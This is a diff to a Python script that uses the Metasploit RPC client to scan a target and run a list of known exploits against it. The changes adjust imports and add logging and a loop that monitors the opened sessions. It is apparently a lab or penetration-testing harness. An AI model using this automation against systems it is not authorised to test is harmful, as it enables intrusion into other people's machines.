@@ -2,14 +2,17 @@
 # which has a vulnerability, and then it exploits that
 # NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY
 
-from pymetasploit3.msfrpc import *
 import time
-import utils
 import sys
+import os
+sys.path.append(os.getcwd() + "/lib/")
+from lib.msfrpc4 import *
 import nmap_dest
 import re
 import subprocess
 from knownVulnerabilities import vulnerabilities
+
+
 
 if __name__ == "__main__":
     #############################################################################
@@ -21,9 +24,10 @@ if __name__ == "__main__":
 
     # basically starts metasploit and kill all previous sessions 
     client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
+    print(client.jobs.list)
     for k in client.sessions.list.keys():
         client.sessions.session(str(k)).stop()
-    print("session list =", client.sessions.list)
+    print("JOBS (should be empty)", "session list =", client.sessions.list)
 
     ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
     # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
@@ -106,7 +110,7 @@ if __name__ == "__main__":
             exploit.execute(payload=vulnerability.payload)
         else:
             exploit.execute()
-        time.sleep(vulnerability.sleep)
+        # time.sleep(vulnerability.sleep)
         numSessions = 0
         for k in client.sessions.list.keys():
             numSessions += 1
@@ -115,6 +119,10 @@ if __name__ == "__main__":
         # for _session in client.sessions.list.keys():
         #     break
     
+    while(client.sessions.list):
+        time.sleep(10)
+        print(client.sessions.list)
+
     ####### Print some info on the sessions created
     print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
     sessions = client.sessions.list
